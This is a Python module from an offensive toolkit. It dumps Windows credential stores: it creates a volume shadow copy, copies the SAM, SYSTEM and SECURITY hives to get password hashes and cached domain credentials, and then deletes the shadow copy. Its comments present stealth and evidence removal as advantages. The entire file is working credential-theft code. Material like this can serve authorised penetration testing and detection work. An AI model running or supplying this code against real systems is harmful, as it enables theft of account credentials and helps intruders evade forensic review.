#!/usr/bin/env python3
"""
SAM/SYSTEM extraction via Volume Shadow Copy
Bypasses file locks by using VSS
"""

import subprocess
import re
from pathlib import Path
from datetime import datetime
from typing import Optional, Dict


class VSSExtractor:
    """
    Extract registry hives from Volume Shadow Copy
    
    OPSEC Level: HIGH
    - Bypasses file system locks
    - Uses legitimate Windows VSS
    - Cleanup removes evidence
    - More stealthy than direct access
    """
    
    METHOD_NAME = "vss"
    OPSEC_RATING = "High"
    
    def __init__(self, output_dir: Path):
        self.output_dir = Path(output_dir)
        self.shadow_id = None
        self.shadow_path = None
    
    def create_shadow_copy(self) -> Optional[str]:
        """
        Create a volume shadow copy
        
        Returns:
            str: Shadow copy device path or None
        """
        print(f"[*] Creating volume shadow copy...")
        
        try:
            # Create shadow copy of C: drive
            cmd_create = "wmic shadowcopy call create Volume='C:\\\\'"
            
            result = subprocess.run(
                cmd_create,
                shell=True,
                capture_output=True,
                text=True,
                timeout=60
            )
            
            if result.returncode != 0:
                print(f"[-] Shadow copy creation failed")
                if result.stderr:
                    print(f"    Error: {result.stderr}")
                return None
            
            print(f"[+] Shadow copy created")
            
            # List shadow copies to get the path
            cmd_list = "vssadmin list shadows"
            
            result = subprocess.run(
                cmd_list,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            if result.returncode != 0:
                print(f"[-] Could not list shadow copies")
                return None
            
            # Parse shadow copy information
            # Looking for: Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy{N}
            lines = result.stdout.split('\n')
            
            shadow_path = None
            shadow_id = None
            
            for i, line in enumerate(lines):
                if 'Shadow Copy Volume:' in line:
                    # Extract path
                    match = re.search(r'(\\\\?\\\w+\\[^\\]+\\HarddiskVolumeShadowCopy\d+)', line)
                    if match:
                        shadow_path = match.group(1)
                    
                    # Also get the shadow copy ID from previous lines
                    for prev_line in reversed(lines[:i]):
                        if 'Shadow Copy ID:' in prev_line:
                            id_match = re.search(r'\{[0-9a-f\-]+\}', prev_line)
                            if id_match:
                                shadow_id = id_match.group(0)
                            break
                    
                    break
            
            if shadow_path:
                self.shadow_path = shadow_path
                self.shadow_id = shadow_id
                
                print(f"[+] Shadow copy path: {shadow_path}")
                
                if shadow_id:
                    print(f"[+] Shadow copy ID: {shadow_id}")
                
                return shadow_path
            else:
                print(f"[-] Could not parse shadow copy path")
                return None
        
        except subprocess.TimeoutExpired:
            print(f"[-] Shadow copy creation timed out")
            return None
        
        except Exception as e:
            print(f"[-] Shadow copy creation failed: {e}")
            return None
    
    def copy_from_shadow(self, shadow_path: str) -> Optional[Dict]:
        """
        Copy registry hives from shadow copy
        
        Args:
            shadow_path: VSS device path
            
        Returns:
            Dict with copied file paths or None
        """
        print(f"\n[*] Copying registry hives from shadow copy...")
        
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        
        # Define source paths in shadow copy
        hive_sources = {
            'SAM': f"{shadow_path}\\Windows\\System32\\config\\SAM",
            'SYSTEM': f"{shadow_path}\\Windows\\System32\\config\\SYSTEM",
            'SECURITY': f"{shadow_path}\\Windows\\System32\\config\\SECURITY"
        }
        
        # Define destination paths
        hive_dests = {
            'SAM': self.output_dir / f"sam_vss_{timestamp}.save",
            'SYSTEM': self.output_dir / f"system_vss_{timestamp}.save",
            'SECURITY': self.output_dir / f"security_vss_{timestamp}.save"
        }
        
        results = {}
        success_count = 0
        
        # Copy each hive
        for hive, source in hive_sources.items():
            dest = hive_dests[hive]
            
            print(f"[*] Copying {hive}...")
            
            # Use copy command
            cmd = f'copy "{source}" "{dest}"'
            
            try:
                result = subprocess.run(
                    cmd,
                    shell=True,
                    capture_output=True,
                    timeout=30
                )
                
                if result.returncode == 0 and dest.exists():
                    size = dest.stat().st_size
                    
                    print(f"[+] {hive} copied successfully")
                    print(f"    File: {dest}")
                    print(f"    Size: {size / 1024:.2f} KB")
                    
                    results[hive.lower()] = str(dest)
                    success_count += 1
                else:
                    print(f"[-] {hive} copy failed")
            
            except subprocess.TimeoutExpired:
                print(f"[-] {hive} copy timed out")
            
            except Exception as e:
                print(f"[-] {hive} copy error: {e}")
        
        if success_count >= 2:
            results['timestamp'] = timestamp
            return results
        else:
            return None
    
    def cleanup_shadow_copy(self):
        """Delete the created shadow copy"""
        if not self.shadow_id:
            return
        
        print(f"\n[*] Cleaning up shadow copy...")
        
        try:
            # Delete by shadow ID
            cmd = f'vssadmin delete shadows /shadow={self.shadow_id} /quiet'
            
            result = subprocess.run(
                cmd,
                shell=True,
                capture_output=True,
                timeout=30
            )
            
            if result.returncode == 0:
                print(f"[+] Shadow copy deleted")
            else:
                print(f"[!] Shadow copy may not have been deleted")
                print(f"[!] Manual cleanup: vssadmin delete shadows /all")
        
        except Exception as e:
            print(f"[!] Shadow copy cleanup failed: {e}")
            print(f"[!] Manual cleanup: vssadmin delete shadows /all")
    
    def extract(self) -> Optional[Dict]:
        """
        Execute SAM/SYSTEM extraction via VSS
        
        Returns:
            Dict with extracted file paths or None on failure
        """
        print(f"\n[*] Method: Volume Shadow Copy (VSS)")
        print(f"[*] OPSEC: {self.OPSEC_RATING} - Bypasses file locks")
        
        try:
            # Create shadow copy
            shadow_path = self.create_shadow_copy()
            
            if not shadow_path:
                return None
            
            # Copy files from shadow
            results = self.copy_from_shadow(shadow_path)
            
            if not results:
                return None
            
            # Add metadata
            results['method'] = self.METHOD_NAME
            results['opsec_rating'] = self.OPSEC_RATING
            
            print(f"\n[+] VSS extraction successful")
            
            return results
        
        finally:
            # Always cleanup shadow copy
            self.cleanup_shadow_copy()
    
    def is_available(self) -> bool:
        """Check if this method is available"""
        # VSS is available on Windows Vista and later
        # Check if vssadmin exists
        try:
            result = subprocess.run(
                'vssadmin /?',
                shell=True,
                capture_output=True,
                timeout=5
            )
            return result.returncode == 0
        except:
            return False
    
    @staticmethod
    def get_info() -> Dict:
        """Get information about this extraction method"""
        return {
            'name': 'vss',
            'description': 'Extract registry hives from Volume Shadow Copy',
            'opsec_rating': 'High',
            'requirements': [
                'Administrative privileges',
                'VSS service running',
                'Sufficient disk space'
            ],
            'advantages': [
                'Bypasses file system locks',
                'No direct registry access',
                'Uses legitimate Windows feature',
                'Cleanup removes evidence',
                'More stealthy than direct access'
            ],
            'disadvantages': [
                'Creates shadow copy (logged)',
                'Requires disk space',
                'Slower than reg save',
                'VSS operations may be monitored'
            ],
            'targets': [
                'SAM (local account hashes)',
                'SYSTEM (boot key for decryption)',
                'SECURITY (cached domain credentials)'
            ]
        }
